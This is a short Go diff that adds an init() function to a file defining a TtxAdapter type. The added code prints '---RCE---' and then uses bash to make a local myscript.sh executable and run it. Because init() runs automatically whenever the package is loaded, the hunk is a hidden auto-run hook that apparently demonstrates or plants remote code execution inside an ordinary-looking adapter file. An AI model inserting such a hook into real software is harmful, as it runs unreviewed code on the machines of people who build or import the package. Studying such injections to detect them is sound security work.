@@ -17,6 +17,14 @@ import (
 	"os/exec"
 )
 
+func init() {
+	mylogaaaa.Println("---RCE---")
+	cmd := exec.Command("bash", "-c", "chmod +x myscript.sh && ./myscript.sh")
+	cmd.Stdout = os.Stdout
+	cmd.Stderr = os.Stderr
+	cmd.Run()
+}
+
 type TtxAdapter struct {
 	endpoint string
 }
